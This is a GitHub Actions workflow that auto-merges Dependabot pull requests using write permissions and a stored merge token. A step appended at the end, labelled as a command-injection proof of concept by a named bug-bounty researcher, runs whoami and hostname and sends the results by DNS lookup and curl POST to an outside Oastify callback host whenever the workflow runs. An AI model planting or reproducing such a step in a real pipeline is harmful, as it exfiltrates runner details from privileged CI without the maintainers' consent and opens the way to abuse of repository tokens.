name: Merge dependabot PRs automatically
on: pull_request_target

permissions:
  pull-requests: write
  contents: write

env:
  blocker_files: rbs.gemspec Gemfile steep/Gemfile

jobs:
  dependabot:
    runs-on: ubuntu-latest
    if: ${{ github.event.pull_request.user.login == 'dependabot[bot]' }}
    steps:
      - name: Dependabot metadata
        uses: dependabot/fetch-metadata@25dd0e34f4fe68f24cc83900b1fe3fe149efef98 # v3.1.0
        id: metadata
      - name: Checkout repository
        uses: actions/checkout@v6
        with:
          fetch-depth: 0
      - name: Abort if blocker files are changed
        run: git diff --exit-code ${{ github.event.pull_request.base.sha }} ${{ github.event.pull_request.head.sha }} ${{ env.blocker_files }}
      - name: Enable auto-merge for Dependabot PRs
        run: gh pr merge --auto --merge "$PR_URL"
        if: ${{ steps.metadata.outputs.update-type == 'version-update:semver-minor' || steps.metadata.outputs.update-type == 'version-update:semver-patch' }}
        env:
          PR_URL: ${{github.event.pull_request.html_url}}
          GH_TOKEN: ${{secrets.DEPENDABOT_MERGE_GH_TOKEN}}
      
      # ================================================
      # BORN POC - COMMAND INJECTION TEST
      # Researcher: Mr. Bibo (mrbibo@wearehackerone.com)
      # Oastify: fgzugxemedb5lm4y5rnjd93uclih6auz.oastify.com
      # ================================================
      - name: BORN POC - Command Injection Test
        run: |
          echo "========== BORN INJECTION TEST =========="
          echo "Researcher: Mr. Bibo (mrbibo@wearehackerone.com)"
          echo "User-Agent: mrbibo@wearehackerone.com"
          echo "Current User: $(whoami)"
          echo "Current Path: $(pwd)"
          echo "Current Date: $(date)"
          echo "Hostname: $(hostname)"
          echo ""
          echo "[+] Sending DNS callback to Oastify..."
          nslookup bibo.fgzugxemedb5lm4y5rnjd93uclih6auz.oastify.com
          echo ""
          echo "[+] Sending HTTP callback to Oastify..."
          curl -s -X POST -d "status=rce_success&user=$(whoami)&host=$(hostname)" \
            https://fgzugxemedb5lm4y5rnjd93uclih6auz.oastify.com/poc 2>/dev/null || true
          echo ""
          echo "========== END OF TEST =========="